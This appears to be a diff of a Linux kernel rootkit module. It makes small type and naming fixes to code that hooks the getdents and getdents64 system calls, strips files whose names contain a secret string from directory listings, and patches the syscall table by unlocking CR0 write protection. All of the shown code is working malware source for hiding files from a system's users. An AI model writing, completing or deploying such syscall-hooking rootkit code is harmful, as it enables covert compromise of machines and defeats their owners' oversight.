@@ -92,7 +92,7 @@ asmlinkage long totallyReal_getdents (int fd, struct linux_dirent *dirp, int cou
 	//pr_info("fakeGetDents: copied original dirp '%p' to new dirp '%p'\n", dirp, mod_dirp);
 
 	// iterate through all files and hide any with secret string in filename
-	long off = 0;
+	int off = 0;
 	struct linux_dirent *p_dirp, *prev;
 	while (off < nread) {
 		p_dirp = (void *)mod_dirp + off;
@@ -112,7 +112,7 @@ asmlinkage long totallyReal_getdents (int fd, struct linux_dirent *dirp, int cou
 			prev = p_dirp;
 		}
 		off += p_dirp->d_reclen;
-		pr_info("fakeGetDents: incrementing pointer by %ld spaces; bytes left to read = %ld\n", off, nread - off);
+		pr_info("fakeGetDents: incrementing pointer by %d spaces; bytes left to read = %d\n", off, nread - off);
 	}
 
 	// copy contents of modified dirp back to original dirp
@@ -148,7 +148,7 @@ asmlinkage long totallyReal_getdents64 (int fd, struct linux_dirent64 *dirp, int
 
 	copy_from_user(mod_dirp, dirp, nread);
 
-	long off = 0;
+	int off = 0;
 	struct linux_dirent64 *p_dirp, *prev;
 	while (off < nread) {
 		p_dirp = (void *)mod_dirp + off;
@@ -166,7 +166,7 @@ asmlinkage long totallyReal_getdents64 (int fd, struct linux_dirent64 *dirp, int
 			prev = p_dirp;
 		}
 		off += p_dirp->d_reclen;
-		pr_info("fakeGetDents: incrementing pointer by %ld spaces; bytes left to read = %ld\n", off, nread - off);
+		pr_info("fakeGetDents: incrementing pointer by %d spaces; bytes left to read = %d\n", off, nread - off);
 	}
 
 	copy_to_user(dirp, mod_dirp, nread);
@@ -177,7 +177,7 @@ asmlinkage long totallyReal_getdents64 (int fd, struct linux_dirent64 *dirp, int
 
 void injectSyscalls(void){
 	int targetIndex;
-	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
+	for(targetIndex = 0; targetIndex < NUM_TARGETS; targetIndex++){
 		if(toInject[targetIndex]){
 			pr_info("Starting injection for target %d\n", targetIndex);
 
@@ -201,7 +201,7 @@ void injectSyscalls(void){
 
 void restoreSyscalls(void){
 	int targetIndex;
-	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
+	for(targetIndex = 0; targetIndex < NUM_TARGETS; targetIndex++){
 		if(toInject[targetIndex]){
 			pr_info("Restoring ptr for target %d\n", targetIndex);
 			CR0_WRITE_UNLOCK({
